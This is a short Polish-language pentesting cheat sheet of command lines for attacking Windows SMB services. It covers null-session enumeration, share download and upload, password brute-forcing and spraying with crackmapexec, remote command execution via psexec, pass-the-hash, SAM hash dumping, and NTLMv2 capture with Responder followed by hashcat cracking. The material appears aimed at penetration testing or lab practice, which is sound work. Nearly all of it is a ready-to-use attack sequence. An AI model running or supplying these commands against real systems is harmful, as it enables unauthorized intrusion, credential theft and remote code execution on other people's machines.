## Nmap
nmap -sC -sV -p 139,445 IP

## Enumercja
smbclient -N -L //IP                          # lista shares (null session)
smbmap -H IP                                  # shares + uprawnienia
smbmap -H IP -r SHARE                         # przeglądaj katalog
rpcclient -U'%' IP                            # null session RPC
enum4linux-ng.py IP -A -C                     # pełna enumercja

## Połączenie
smbclient -U user //IP/SHARE

## Pobieranie/wysyłanie
smbmap -H IP --download "SHARE\plik"
smbmap -H IP --upload plik.txt "SHARE\plik.txt"

## Brute-force/Spraying
crackmapexec smb IP -u users.list -p /usr/share/wordlists/rockyou.txt --local-auth
crackmapexec smb IP -u user -p /usr/share/wordlists/rockyou.txt --local-auth

## RCE
impacket-psexec admin:'Hasło'@IP
crackmapexec smb IP -u admin -p 'Hasło' -x 'whoami'

## Pass-the-Hash
crackmapexec smb IP -u admin -H NTHASH

## Dump SAM
crackmapexec smb IP -u admin -p 'Hasło' --sam

## Responder
sudo responder -I eth0
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
